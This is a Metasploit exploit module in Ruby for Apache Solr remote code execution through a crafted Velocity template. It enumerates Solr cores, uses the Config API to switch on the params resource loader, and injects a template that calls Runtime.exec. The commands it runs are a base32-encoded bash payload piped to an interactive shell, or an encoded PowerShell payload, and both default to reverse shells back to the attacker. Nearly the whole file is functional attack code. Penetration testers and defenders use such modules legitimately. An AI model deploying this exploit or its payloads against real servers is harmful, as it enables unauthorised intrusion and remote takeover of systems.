##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary TCP server.
#
###
require 'json'
require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  #
  # This exploit affects TCP servers, so we use the TCP client mixin.
  # See ./documentation/samples/vulnapps/testsrv/testsrv.c for building the
  # vulnerable target program.
  #
  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        # The Name should be just like the line of a Git commit - software name,
        # vuln type, class. It needs to fit in 50 chars ideally. Preferably apply
        # some search optimization so people can actually find the module.
        # We encourage consistency between module name and file name.
        'Name'           => 'Apache Solr Remote Code Execution via Velocity Template',
        'Description'    => %q(
          This module exploits a vulnerability in Apache Solr <= 8.2.0 which allows remote code execution via a custom
          Velocity template.

          From the Tenable advisory:
          An attacker could target a vulnerable Apache Solr instance by first identifying a list
          of Solr core names. Once the core names have been identified, an attacker can send a specially crafted
          HTTP POST request to the Config API to toggle the params resource loader value for the Velocity Response
          Writer in the solrconfig.xml file to true. Enabling this parameter would allow an attacker to use the Velocity
          template parameter in a specially crafted Solr request, leading to RCE. This vulnerability currently does not
          have a CVE number assigned.

          Payload defaults to x86 Meterpreter reverse TCP for Windows and plain old reverse TCP shell for Linux.
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            's00py',
            'jas502n', # exploit code on Github
            'AleWong', # ExploitDB contribution, and exploit code on Github
            'Imran E. Dawoodjee <imran[at]threathounds.com>' # Metasploit module
          ],
        'References'     =>
            [
              [ 'EDB', '47572' ],
              [ 'URL', 'https://www.tenable.com/blog/apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability'],
              [ 'URL', 'https://www.huaweicloud.com/en-us/notice/2018/20191104170849387.html'],
              [ 'URL', 'https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133/'],
              [ 'URL', 'https://github.com/jas502n/solr_rce'],
              [ 'URL', 'https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template'],
            #[ 'CVE', 'CVE-1111-2222'],
            ],
        'Platform'       => ['unix', 'win'],
        'Targets'        =>
            [
              [
                'Unix-based',
                {
                  'DefaultOptions' => { 'PAYLOAD'  => 'cmd/unix/reverse_bash' },
                  'Arch'     => ARCH_CMD,
                  'Platform' => 'Unix',
                }
              ],
              [
                'x86/x64 Windows',
                {
                  'DefaultOptions' => { 'PAYLOAD'  => 'windows/meterpreter/reverse_tcp' },
                  'Arch'     => [ARCH_X86, ARCH_X64],
                  'Platform' => 'Windows',
                }
              ]
            ],
        'DisclosureDate' => "Oct 29 2019",
        'Privileged'     => false
      )
    )

    register_options(
      [
        Opt::RPORT(8983),
        OptString.new('USERNAME', [false, 'Solr username (default is solr)', '']),
        OptString.new('PASSWORD', [false, 'Solr password (default is SolrRocks)', ''])
      ]
    )
  end

  # are we just checking? or are we exploiting?
  @vuln_check = true
  # if we are just checking, we only need one core to be exploitable
  @core_name = ""
  # OS specific stuff
  @target_platform = ""
  @target_arch = ""
  # has the switch been flicked?
  @params_resource_loader_enabled = false
  # if authentication is used
  @auth_string = ""

  # check for vulnerability existence
  def check
    # see if authentication is required for the specified Solr instance
    auth_check = send_request_cgi({
                 'method'  => 'GET',
                 'headers' => { 'Connection' => 'Keep-Alive' },
                 'uri'     => '/solr/'
      })
    # if return code is not 200, then the Solr instance definitely requires authentication
    unless auth_check.code == 200
      print_warning("Authentication required for #{peer}!")
      vprint_warning("Server auth banner: #{auth_check['WWW-Authenticate']}")
      # no creds provided means we cannot reliably check exploitability
      if datastore['USERNAME'] == "" and datastore['PASSWORD'] == ""
        print_error("Credentials not provided, skipping credentialed check...")
        return CheckCode::Unknown
      # otherwise, attempt authentication
      else
        print_status("Attempting authentication for #{peer}...")
        attempt_auth = send_request_cgi({
                       'method'  => 'GET',
                       'headers' => {
                                      'Connection'    => 'Keep-Alive',
                                      'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
                                    },
                       'uri'     => '/solr/'
          })

        unless attempt_auth.code == 200
          print_status("Authentication failed!")
          return CheckCode::Unknown
        end

        print_good("Authentication succeeded!")
        @auth_string = basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        # TODO: add creds to MSF database
      end
    end

    # if successful authentication happens, user the authorization header for the rest of the check
    if @auth_string == ""
      @headers = {
        'Connection'   => 'Keep-Alive',
      }
    else
      @headers = {
        'Connection'      => 'Keep-Alive',
        'Authorization'   => @auth_string.to_s
      }
    end

    # send a GET request to get Solr and system details
    ver = send_request_cgi({
          'method'  => 'GET',
          'headers' => @headers,
          'uri'     => '/solr/admin/info/system?wt=json'
      })

    # can't connect? that's an automatic failure
    unless ver
      vprint_error("Connection failed!")
      return CheckCode::Unknown
    end

    # convert to JSON
    ver_json = ver.get_json_document
    # get Solr version
    @solr_version = Gem::Version.new(ver_json['lucene']['solr-spec-version'])
    print_status("Found Apache Solr #{@solr_version}")
    # get OS version details
    @target_platform = ver_json['system']['name']
    @target_arch = ver_json['system']['arch']
    @target_osver = ver_json['system']['version']
    print_status("OS version is #{@target_platform} #{@target_arch} #{@target_osver}")
    # uname doesn't show up for Windows, so run a check for that.
    if ver_json['system']['uname']
      @uname = ver_json['system']['uname'].strip
      # print uname only when verbose
      vprint_status("Full uname is '#{@uname}'")
    end

    # the vulnerability is only present in Solr versions <= 8.3.0
    unless @solr_version <= Gem::Version.new('8.3.0')
      return CheckCode::Safe
    end

    # enumerate cores
    cores = send_request_cgi({
            'method'  => 'GET',
            'headers' => @headers,
            'uri'     => '/solr/admin/cores?wt=json'
      })

    # can't connect? that's yet another automatic failure
    unless cores
      vprint_error("Could not enumerate cores!")
      return CheckCode::Unknown
    end

    # convert to JSON yet again
    cores_json = cores.get_json_document
    @cores_list = Array.new()
    # get the core names
    cores_json['status'].keys.each do |core_name|
      @cores_list.push(core_name)
    end

    # no cores? that means nothing to exploit.
    if @cores_list.length == 0
      print_error("No cores found, nothing to exploit!")
      return CheckCode::Safe
    end

    # got cores? tell the operator which cores were found
    print_good("Found core(s): #{@cores_list.join(", ")}")
    # for each core, attempt to get the config as JSON
    @cores_list.each do |core_name|
      core_config = send_request_cgi({
                    'method'  => 'GET',
                    'headers' => @headers,
                    'uri'     => "/solr/#{core_name}/config?wt=json"
        })

      # can't retrieve configuration for that core? go next
      unless core_config
        vprint_error("Could not retrieve configuration for core #{core_name}!")
        next
      end

      # convert to JSON... for the third time
      core_config_json = core_config.get_json_document
      # if the core configuration does not include the Velocity Response Writer, go check the next core
      unless core_config_json['config']['queryResponseWriter'].keys.include?("velocity")
        vprint_error("Velocity Response Writer not found in core #{core_name}")
        next
      end
      vprint_good("Found Velocity Response Writer in use by core #{core_name}")

      # if params.resource.loader.enabled is false, we need to set it to true before exploitation
      if core_config_json['config']['queryResponseWriter']['velocity']['params.resource.loader.enabled'] == "true"
        print_good("params.resource.loader.enabled for core '#{core_name}' is set to true.")
        @params_resource_loader_enabled = true
      else
        vprint_warning("params.resource.loader.enabled for core #{core_name} is set to false.")
      end

      # if we are preparing to exploit, the first core that fits the criteria is selected.
      # whether or not the core has params.resource.loader.enabled is not a factor
      # as it can be modified during the exploit
      if @vuln_check == false
        @core_name = core_name
        return CheckCode::Vulnerable
      end
    end

    return CheckCode::Vulnerable
  end

  # the exploit method
  def exploit
    # we are prepping to check and exploit, not prepping to check only
    @vuln_check = false
    unless [CheckCode::Vulnerable].include? check
      fail_with(Failure::NotVulnerable, 'Target is most likely not vulnerable!')
    end

    # the new config in JSON format
    @enable_params_resource_loader = {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }.to_json

    # if params.resource.loader.enabled is not true
    if @params_resource_loader_enabled != true
      print_status("params.resource.loader.enabled is not true, setting it to true...")
      update_config = send_request_cgi({
                      'method'        => 'POST',
                      'headers'       => @headers,
                      'ctype'         => 'application/json;charset=utf-8',
                      'encode_params' => false,
                      'uri'           => "/solr/#{@core_name}/config",
                      'data'          => @enable_params_resource_loader
        })

      # if we got anything other than a 200 back, the configuration update failed and the exploit won't work
      unless update_config.code == 200
        fail_with(Failure::UnexpectedReply, 'Unable to update config, exploit failed!')
      end

      print_good("params.resource.loader.enabled is now set to true!")
    end

    # windows...
    if @target_platform.include? "Windows"
      # if target is wrong, warn and exit before doing anything
      unless targets[datastore['TARGET']].name.include? "Windows"
        fail_with(Failure::NoTarget, 'Target is found to be Windows, please select the proper target!')
      end

      # exploiting for Windows relies heavily on PowerShell, so go find it first
      # TODO: will CmdStager work if PowerShell not found?
      psh_enum = execute_command("where%20powershell", {'core_name' => @core_name})
      # abort the exploit if PowerShell was not found
      unless (/powershell/i) =~ psh_enum.body.to_s
        fail_with(Failure::NoTarget, "PowerShell not found, aborting exploit attempt!")
      end

      vprint_good("PowerShell found at #{psh_enum.body.to_s.split('0  ')[1].strip}")
      # generate PowerShell command, encode with base64, and remove comspec
      psh_command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, remove_comspec: true)
      # prepare to exploit...
      execute_command(Rex::Text.uri_encode(psh_command), {'core_name' => @core_name})
    end

    # or unix-based?
    if @target_platform.include? "Linux"
      # if target is wrong, warn and exit before doing anything
      unless targets[datastore['TARGET']].name.include? "Unix"
        fail_with(Failure::NoTarget, 'Target is found to be Unix-based, please select the proper target!')
      end

      # base32 encoded payload is the safest, without any sort of special characters except "="
      b32_payload = Rex::Text.encode_base32(generate_payload().raw)
      # on Unix, works best with bash, got some serious beef with plain old sh
      bash_payload = "bash%20-c%20{echo,#{b32_payload}}|{base32,-d}|{bash,-i}"
      # prepare to exploit...
      execute_command(bash_payload, {'core_name' => @core_name})
    end
  end

  # sic 'em, bois!
  def execute_command(cmd, opts = {})
    # custom template which enables command execution.
    @custom_template = "%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27PAYLOAD_HERE%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    # substitute the payload into the template...
    @weaponized_template = @custom_template.gsub("PAYLOAD_HERE", cmd)
    # execute the exploit...
    send_request_cgi({
                         'method'  => 'GET',
                         'uri'     => "/solr/#{opts['core_name']}/select?q=1&wt=velocity&v.template=custom&v.template.custom=#{@weaponized_template}",
                         'headers' => @headers,
      })
  end
end
